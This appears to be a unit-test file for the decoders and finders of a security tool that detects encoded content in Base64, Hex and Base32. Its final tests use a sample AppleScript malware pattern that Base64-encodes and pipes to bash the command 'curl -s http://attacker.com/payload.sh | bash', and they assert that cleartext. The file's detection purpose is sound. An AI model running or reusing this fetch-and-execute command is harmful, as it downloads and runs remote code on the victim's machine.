'use strict';
// base64-hex.test.js — Base64 / Hex / Base32 decode round-trips.
//
// `base64-hex.js` mounts both *finder* and *decoder* methods onto
// `EncodedContentDetector.prototype`. The finders are heavy (regex +
// entropy + plausibility gates) and exercised by the e2e fixture
// suite. Here we cover the three pure decoders directly:
// `_decodeBase64`, `_decodeHex`, `_decodeBase32`. They are the
// terminal step of the recursive decode pipeline — every Base64 /
// Hex finding eventually hits one of these methods.

const test = require('node:test');
const assert = require('node:assert/strict');
const { loadModules } = require('../helpers/load-bundle.js');

// The decoder methods live on `EncodedContentDetector.prototype` after
// the Object.assign call in base64-hex.js runs; load both files.
const ctx = loadModules([
  'src/constants.js',
  'src/encoded-content-detector.js',
  'src/decoders/whitelist.js',
  'src/decoders/entropy.js',
  'src/decoders/base64-hex.js',
]);
const { EncodedContentDetector } = ctx;
const detector = new EncodedContentDetector();

/** Convert a Uint8Array to an ASCII string (host realm safe). */
function bytesToAscii(bytes) {
  return String.fromCharCode.apply(null, Array.from(bytes));
}

test('base64-hex: _decodeBase64 round-trips a simple ASCII payload', () => {
  // "Hello, World!" → "SGVsbG8sIFdvcmxkIQ=="; the canonical Base64
  // smoke test. Verifies the atob path + the byte-extract loop.
  const out = detector._decodeBase64('SGVsbG8sIFdvcmxkIQ==');
  assert.ok(out instanceof ctx.Uint8Array, 'must return Uint8Array');
  assert.equal(bytesToAscii(out), 'Hello, World!');
});

test('base64-hex: _decodeBase64 normalises URL-safe alphabet', () => {
  // The decoder accepts the URL-safe Base64 variant (RFC 4648 §5):
  // `+` → `-`, `/` → `_`, optional `=` padding stripped. The
  // decoder swaps them back before atob.
  // "??>?" (bytes 3F 3F 3E 3F) → standard "Pz8+Pw==", URL-safe "Pz8-Pw"
  const out = detector._decodeBase64('Pz8-Pw');
  assert.deepEqual(Array.from(out), [0x3F, 0x3F, 0x3E, 0x3F]);
});

test('base64-hex: _decodeBase64 auto-pads missing `=`', () => {
  // Real-world payloads are routinely stripped of trailing `=` to dodge
  // naïve detectors. The decoder pads on the way in — round-trip must
  // still produce the canonical bytes.
  // "abc" → "YWJj" (no padding required), "ab" → "YWI=" but "YWI" un-
  // padded is what we test.
  const out = detector._decodeBase64('YWI');
  assert.equal(bytesToAscii(out), 'ab');
});

test('base64-hex: _decodeBase64 returns null for invalid input', () => {
  // The atob() path throws on non-Base64 bytes; the decoder catches and
  // returns null so the caller can drop the candidate without a console
  // wall of errors.
  assert.equal(detector._decodeBase64('!!!not-base64!!!'), null);
});

// ── Whitespace-wrapped decode ────────────────────────────────────────────────
// Real-world Base64 is routinely wrapped at 50/60/64/72/76 chars (MIME,
// PEM, PowerShell here-strings). The decoder must strip interior
// whitespace before `atob` so a wrapped payload round-trips to identical
// bytes regardless of wrap width. Without the `\s+` strip added alongside
// these tests, the `normalised.length % 4` padding calculation is off
// by however many whitespace chars are in the string, and `atob` on the
// result either throws or decodes at a misaligned boundary.

test('base64-hex: _decodeBase64 strips CRLF-wrapped whitespace before decode', () => {
  // 100-byte payload → 136-char base64; split into 64+64+8 across two
  // CRLFs. The canonical byte sequence must match regardless of wrap.
  const clean = 'VGhlIHF1aWNrIGJyb3duIGZveCBqdW1wcyBvdmVyIHRoZSBsYXp5IGRvZywgYWdhaW4gYW5kIGFnYWluIHVudGlsIHRoZSB0eXBld3JpdGVyIGRpZXMu'; // 116 chars
  const wrapped = clean.match(/.{1,60}/g).join('\r\n');
  const outClean = detector._decodeBase64(clean);
  const outWrapped = detector._decodeBase64(wrapped);
  assert.ok(outWrapped instanceof ctx.Uint8Array);
  assert.deepEqual(Array.from(outWrapped), Array.from(outClean),
    'CRLF-wrapped b64 must decode to identical bytes as the unwrapped form');
});

test('base64-hex: _decodeBase64 strips space-wrapped whitespace before decode', () => {
  // Single-line space-wrapped variant: `AAAA BBBB CCCC …`.
  const clean = 'SGVsbG8sIFdvcmxkISBIZWxsbywgV29ybGQh';
  const wrapped = clean.match(/.{1,4}/g).join(' ');
  const outClean = detector._decodeBase64(clean);
  const outWrapped = detector._decodeBase64(wrapped);
  assert.deepEqual(Array.from(outWrapped), Array.from(outClean));
});

test('base64-hex: _decodeBase32 strips whitespace before decode', () => {
  // Parity with _decodeBase64 / _decodeHex. Wrapped Base32 from the
  // canonical GNU `base32` output.
  const clean = 'MZXW6YTBOI======';   // "foobar"
  const wrapped = 'MZXW 6YTB OI==\n====';
  assert.equal(bytesToAscii(detector._decodeBase32(clean)), 'foobar');
  assert.equal(bytesToAscii(detector._decodeBase32(wrapped)), 'foobar');
});

// ── Wrapped-block finders ────────────────────────────────────────────────────
// The finders must detect MIME / PEM / here-string style wrapped Base64,
// Hex, and Base32 and emit ONE candidate per block (not one per line).
// `raw` carries the whitespace-free concatenation; `offset`/`length`
// cover the wrapped span in the source text so click-to-focus still
// lands on the right bytes.

/**
 * Build a short PE-ish header that passes the TVqQ high-confidence prefix
 * check. Returns { text, clean, wrapped }. The wrapped form is split at
 * `wrapCols` with CRLF joins and a 4-space indent on lines 2..N to mimic
 * a PowerShell here-string.
 */
function buildWrappedPePayload(wrapCols) {
  // Real MZ header + DOS stub bytes (64 bytes) + 36 bytes of zeroes,
  // enough for the Base64-encoded form to exceed the 64-char default
  // floor once split into ≥2 fragments. Starts with `4D 5A` so the
  // base64 form begins with `TVqQ`.
  const header = new Uint8Array([
    0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00,
    0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00,
    0x0E, 0x1F, 0xBA, 0x0E, 0x00, 0xB4, 0x09, 0xCD, 0x21, 0xB8, 0x01, 0x4C, 0xCD, 0x21, 0x54, 0x68,
    0x69, 0x73, 0x20, 0x70, 0x72, 0x6F, 0x67, 0x72, 0x61, 0x6D, 0x20, 0x63, 0x61, 0x6E, 0x6E, 0x6F,
    0x74, 0x20, 0x62, 0x65, 0x20, 0x72, 0x75, 0x6E,
  ]);
  // Host Buffer → base64 (Node test context).
  const clean = Buffer.from(header).toString('base64');
  const wrapped = clean.match(new RegExp(`.{1,${wrapCols}}`, 'g')).join('\r\n');
  return { clean, wrapped };
}

test('base64-hex: _findBase64Candidates detects CRLF-wrapped PE header (high-confidence)', () => {
  // Multi-line wrap at 60 cols. The wrapped block must surface as ONE
  // candidate whose `raw` equals the clean (unwrapped) base64, with
  // confidence=high and the TVqQ high-confidence prefix hint.
  const { clean, wrapped } = buildWrappedPePayload(60);
  const text = `some leading context\n\n${wrapped}\n\ntrailing text`;
  const cands = detector._findBase64Candidates(text, {});
  const hit = cands.find(c => c.raw === clean);
  assert.ok(hit, `expected wrapped-block candidate with clean=${clean.length}ch; got ${cands.length} candidate(s): ${cands.map(c => `(${c.raw.length}ch,${c.confidence})`).join(', ')}`);
  assert.equal(hit.confidence, 'high');
  assert.equal(hit.hint, 'PE executable (MZ)');
  assert.equal(hit.autoDecoded, true);
  // Offset points at the first character of the wrapped span, not the
  // leading "some leading context" line.
  assert.equal(text.substr(hit.offset, 4), 'TVqQ');
  // Length spans the wrapped run (includes the CRLF joins), so offset
  // + length is within text.length (fuzz invariant).
  assert.ok(hit.offset + hit.length <= text.length);
  assert.ok(hit.length > clean.length, 'wrapped length must exceed clean length');
});

test('base64-hex: _findBase64Candidates detects 76-col MIME-style wrap', () => {
  // The canonical MIME (RFC 2045 §6.8) wrap width is 76 chars. Must
  // still emit a single candidate.
  const { clean, wrapped } = buildWrappedPePayload(76);
  const cands = detector._findBase64Candidates(wrapped, {});
  const hit = cands.find(c => c.raw === clean);
  assert.ok(hit, `76-col MIME-style wrap must be detected; got ${JSON.stringify(cands.map(c => c.raw.length))}`);
});

test('base64-hex: _findBase64Candidates round-trips a wrapped PE header through _decodeBase64', () => {
  // End-to-end: the wrapped candidate's `raw` decodes to bytes whose
  // first two match the PE `MZ` magic (0x4D 0x5A).
  const { wrapped } = buildWrappedPePayload(50);
  const cands = detector._findBase64Candidates(wrapped, {});
  const hit = cands.find(c => c.confidence === 'high' && c.hint === 'PE executable (MZ)');
  assert.ok(hit, 'wrapped PE candidate must emit');
  const bytes = detector._decodeBase64(hit.raw);
  assert.ok(bytes instanceof ctx.Uint8Array, 'decoded bytes returned');
  assert.equal(bytes[0], 0x4D, 'first byte must be M');
  assert.equal(bytes[1], 0x5A, 'second byte must be Z');
});

test('base64-hex: _findBase64Candidates suppresses wrapped block inside PEM envelope', () => {
  // PEM-wrapped Base64 is EXPLICITLY handled by the PemRenderer (or
  // x509 decoder). The wrapped pre-pass must honour `_isPEMBlock`'s
  // 60-char lookback and skip the block entirely — otherwise every
  // certificate in a log file would emit a noise Detection.
  const { wrapped } = buildWrappedPePayload(64);
  const text =
    '-----BEGIN CERTIFICATE-----\n' +
    wrapped + '\n' +
    '-----END CERTIFICATE-----\n';
  const cands = detector._findBase64Candidates(text, {});
  // No wrapped-block candidate starting at the PEM body should emit.
  const bodyOffset = text.indexOf('TVqQ');
  assert.ok(bodyOffset > 0, 'test fixture must contain TVqQ (PE b64 prefix)');
  const hit = cands.find(c => c.offset === bodyOffset && c._wrapped);
  assert.equal(hit, undefined,
    `PEM-wrapped block must be suppressed by _isPEMBlock; got: ${JSON.stringify(cands.map(c => ({o:c.offset,h:c.hint,w:c._wrapped})))}`);
});

test('base64-hex: _findBase64Candidates single-line space-wrapped is detected in bruteforce mode', () => {
  // `AAAAA BBBBB CCCCC …` — some editors / docs break Base64 on
  // spaces. The single-line regex in `_scanWrappedBlocks` requires
  // ≥3 fragments; bruteforce lowers the min-fragment length to 4.
  const det = new EncodedContentDetector({ bruteforce: true });
  const clean = 'VGhlcXVpY2ticm93bmZveGp1bXBzb3ZlcnRoZWxhenlkb2c=';
  const wrapped = clean.match(/.{1,8}/g).join(' ');
  const cands = det._findBase64Candidates(wrapped, {});
  const hit = cands.find(c => c.raw === clean);
  assert.ok(hit,
    `single-line space-wrapped b64 must emit a candidate; got: ${JSON.stringify(cands.map(c => c.raw.slice(0,16)))}`);
});

test('base64-hex: wrapped-block pre-pass does not double-emit with the per-line loop', () => {
  // When the wrapped pre-pass emits a candidate for a block, the main
  // regex loop must skip matches inside that span — otherwise the
  // finding list contains both (a) the wrapped+stripped candidate and
  // (b) N per-line short candidates that each decode at a misaligned
  // boundary. Assert there's exactly ONE candidate whose raw starts
  // with the TVqQ prefix.
  const { wrapped } = buildWrappedPePayload(60);
  const cands = detector._findBase64Candidates(wrapped, {});
  const tvqqHits = cands.filter(c => c.raw.startsWith('TVqQ'));
  assert.equal(tvqqHits.length, 1,
    `expected exactly one TVqQ candidate, got ${tvqqHits.length}: ${JSON.stringify(tvqqHits.map(c => ({len:c.raw.length, conf:c.confidence, wrap:c._wrapped})))}`);
  assert.equal(tvqqHits[0]._wrapped, true);
});

test('base64-hex: _findHexCandidates detects CRLF-wrapped PE hex dump', () => {
  // Same payload shape as the Base64 test but in hex. Starts with
  // `4d5a` so the high-confidence `startsWithMZ` prefix applies.
  const cleanHex = '4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000080000000';
  const wrapped = cleanHex.match(/.{1,40}/g).join('\r\n');
  const cands = detector._findHexCandidates(wrapped, {});
  const hit = cands.find(c => c.raw === cleanHex && c.type === 'Hex');
  assert.ok(hit, `wrapped hex PE dump must emit; got: ${JSON.stringify(cands.map(c => ({len:c.raw.length, type:c.type})))}`);
  assert.equal(hit.confidence, 'high');
  assert.equal(hit.hint, 'PE executable header (4D5A)');
});

test('base64-hex: _findBase32Candidates detects wrapped Base32 with contextual keyword', () => {
  // Base32 requires a contextual keyword in default mode (`_hasBase32Context`).
  // "payload:" preceding the block satisfies that requirement.
  const cleanB32 = 'JBSWY3DPEHPK3PXPJBSWY3DPEHPK3PXPJBSWY3DPEHPK3PXPJBSWY3DPEHPK3PXP';
  const wrapped = cleanB32.match(/.{1,20}/g).join('\n');
  const text = `payload: ${wrapped}`;
  const cands = detector._findBase32Candidates(text, {});
  const hit = cands.find(c => c.raw === cleanB32);
  assert.ok(hit, `wrapped Base32 with payload: context must emit; got: ${JSON.stringify(cands.map(c => c.raw.length))}`);
});

test('base64-hex: _decodeHex round-trips an even-length hex string', () => {
  // "deadbeef" → 4 bytes [0xDE, 0xAD, 0xBE, 0xEF]. Standard contiguous-
  // hex shape (no `0x` prefix, no separators).
  const out = detector._decodeHex('deadbeef');
  assert.deepEqual(Array.from(out), [0xDE, 0xAD, 0xBE, 0xEF]);
});

test('base64-hex: _decodeHex strips whitespace before parsing', () => {
  // PowerShell byte arrays / shellcode comments often interleave
  // whitespace. The decoder collapses any `\s+` run before chunking
  // into pairs. This is the implementation contract; verify here so
  // a future "tighten whitespace handling" change announces itself.
  const out = detector._decodeHex('de ad\tbe\nef');
  assert.deepEqual(Array.from(out), [0xDE, 0xAD, 0xBE, 0xEF]);
});

test('base64-hex: _decodeHex returns null for odd-length input', () => {
  // Hex with an odd number of digits cannot represent a whole byte
  // count — the decoder rejects rather than silently truncating.
  assert.equal(detector._decodeHex('abc'), null);
});

test('base64-hex: _decodeBase32 round-trips an RFC 4648 fixture', () => {
  // RFC 4648 §10 fixture: "foobar" → "MZXW6YTBOI======". With
  // `=`-padding stripped (the decoder strips trailing `=` first),
  // "MZXW6YTBOI" decodes back to bytes 'f','o','o','b','a','r'.
  const out = detector._decodeBase32('MZXW6YTBOI======');
  assert.equal(bytesToAscii(out), 'foobar');
});

test('base64-hex: _decodeBase32 lowercase input is normalised', () => {
  // The decoder applies `ch.toUpperCase()` before alphabet lookup so
  // a lowercase input string still resolves. Real-world payloads are
  // a mix of cases.
  const out = detector._decodeBase32('mzxw6ytboi');
  assert.equal(bytesToAscii(out), 'foobar');
});

test('base64-hex: _decodeBase32 returns null for non-Base32 chars', () => {
  // The Base32 alphabet is A-Z + 2-7. Anything outside (e.g. `1`, `0`,
  // `8`, `9`, lowercase letters that aren't normalised) is rejected
  // via the `alphabet.indexOf(ch) === -1` gate, returning null.
  assert.equal(detector._decodeBase32('00000000'), null);
});

// ── AppleScript base64-decode-var rescue pass ─────────────────────────────

test('base64-hex: AppleScript rescue emits 60-char b64 in `set X to "…"` + `base64 -D` context', () => {
  // The default-mode length floor is 64 chars. A real-world
  // AppleScript malware pattern looks like:
  //
  //   set b64 to "Y3VybCAtcyBodHRwOi8vYXR0YWNrZXIuY29tL3BheWxvYWQuc2ggfCBiYXNo"
  //   do shell script "echo " & b64 & " | base64 -D | bash"
  //
  // The base64 is 60 chars — below the floor. Without the rescue, no
  // top-level Base64 finding emits, so the embedded URL IOC never
  // surfaces until the analyst clicks "Load for analysis" on the
  // AppleScript shell-sink finding. The rescue detects the
  // `set <var> to "…"` preamble + downstream `<var> … base64 -D` usage
  // and promotes the candidate to high-confidence.
  const b64 = 'Y3VybCAtcyBodHRwOi8vYXR0YWNrZXIuY29tL3BheWxvYWQuc2ggfCBiYXNo'; // 60 chars
  const text =
    `set b64 to "${b64}"\n` +
    `do shell script "echo " & b64 & " | base64 -D | bash"`;
  const cands = detector._findBase64Candidates(text, {});
  const hit = cands.find(c => c.raw === b64);
  assert.ok(hit, `expected base64 rescue candidate; got: ${JSON.stringify(cands)}`);
  assert.equal(hit.confidence, 'high');
  assert.equal(hit.autoDecoded, true);
  assert.equal(hit.hint, 'AppleScript base64-decode variable');
});

test('base64-hex: AppleScript rescue does NOT fire when downstream has no base64 -D', () => {
  // Conservative gate: the rescue must see a `base64 -D|-d|--decode`
  // pipeline downstream. A bare quoted 60-char blob without the
  // downstream context stays below the 64-char floor.
  const b64 = 'Y3VybCAtcyBodHRwOi8vYXR0YWNrZXIuY29tL3BheWxvYWQuc2ggfCBiYXNo';
  const text =
    `set b64 to "${b64}"\n` +
    `do shell script "echo " & b64 & " | cat"`;
  const cands = detector._findBase64Candidates(text, {});
  const hit = cands.find(c => c.raw === b64);
  assert.equal(hit, undefined,
    `no base64 -D context → rescue must not fire; got: ${JSON.stringify(cands)}`);
});

test('base64-hex: AppleScript rescue requires `set` preamble (skips bare quoted blobs)', () => {
  // The rescue trigger is specifically `set <var> to "<b64>"`. A bare
  // quoted 60-char blob not bound to a named variable doesn't get
  // rescued — even if `base64 -D` appears elsewhere in the file.
  const b64 = 'Y3VybCAtcyBodHRwOi8vYXR0YWNrZXIuY29tL3BheWxvYWQuc2ggfCBiYXNo';
  const text =
    `display dialog "${b64}"\n` +
    `do shell script "echo something | base64 -D | bash"`;
  const cands = detector._findBase64Candidates(text, {});
  const hit = cands.find(c => c.raw === b64);
  assert.equal(hit, undefined,
    `bare quoted b64 without set-preamble must not rescue; got: ${JSON.stringify(cands)}`);
});

test('base64-hex: AppleScript rescue decodes the candidate to the expected curl-pipe-shell cleartext', () => {
  // End-to-end: the rescued candidate's raw bytes round-trip through
  // the `_decodeBase64` path to the original curl-pipe-bash string.
  const b64 = 'Y3VybCAtcyBodHRwOi8vYXR0YWNrZXIuY29tL3BheWxvYWQuc2ggfCBiYXNo';
  const text =
    `set b64 to "${b64}"\n` +
    `do shell script "echo " & b64 & " | base64 -D | bash"`;
  const cands = detector._findBase64Candidates(text, {});
  const hit = cands.find(c => c.raw === b64);
  assert.ok(hit, 'rescue candidate must emit');
  const decoded = detector._decodeBase64(hit.raw);
  assert.ok(decoded instanceof ctx.Uint8Array);
  assert.equal(bytesToAscii(decoded),
    'curl -s http://attacker.com/payload.sh | bash');
});
